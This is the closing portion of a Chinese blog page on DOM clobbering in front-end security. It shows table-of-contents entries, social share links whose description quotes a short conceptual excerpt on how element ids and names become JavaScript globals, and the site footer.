toc-level-3"><a class="toc-link" href="#Clobbering-DOM-attributes-to-bypass-HTML-filters"><span class="toc-number">1.3.2.</span> <span class="toc-text">Clobbering DOM attributes to bypass HTML filters</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.5.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&text=前端安全---Dom Clobbering"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&title=前端安全---Dom Clobbering"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&is_video=false&description=前端安全---Dom Clobbering"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=前端安全---Dom Clobbering&body=Check out this article: http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&title=前端安全---Dom Clobbering"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&title=前端安全---Dom Clobbering"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&title=前端安全---Dom Clobbering"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&title=前端安全---Dom Clobbering"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&name=前端安全---Dom Clobbering&description=&lt;h1 id=&#34;前端安全—Dom-Clobbering&#34;&gt;&lt;a href=&#34;#前端安全—Dom-Clobbering&#34; class=&#34;headerlink&#34; title=&#34;前端安全—Dom Clobbering&#34;&gt;&lt;/a&gt;前端安全—Dom Clobbering&lt;/h1&gt;&lt;p&gt;首先给出几个关键点：&lt;/p&gt;
&lt;p&gt;1、&lt;code&gt;HTML&lt;/code&gt;设定&lt;code&gt;id&lt;/code&gt;之后，可以在&lt;code&gt;JS&lt;/code&gt;中直接使用&lt;code&gt;window.id&lt;/code&gt;来使用，或者直接使用&lt;code&gt;id&lt;/code&gt;，&lt;code&gt;JS&lt;/code&gt;会根据作用域规则，如果当前作用域没有就会向上寻找。&lt;/p&gt;
&lt;p&gt;2、官方文档给出，除了&lt;code&gt;id&lt;/code&gt;以外，&lt;code&gt;embed&lt;/code&gt;、&lt;code&gt;form&lt;/code&gt;、&lt;code&gt;img&lt;/code&gt;、&lt;code&gt;object&lt;/code&gt;这四个标签的&lt;code&gt;name&lt;/code&gt;也具有同样特性。&lt;/p&gt;
&lt;p&gt;3、在&lt;code&gt;HTML&lt;/code&gt;元素利用，有两个特殊标签&lt;code&gt;&amp;lt;area&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;，在进行&lt;code&gt;toString&lt;/code&gt;方法的时候，会返回其&lt;code&gt;href&lt;/code&gt;属性的值。&lt;/p&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

      
      <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2022 John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

      
<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- Google Analytics -->

<!-- Disqus Comments -->


    </div>
</body>
</html>
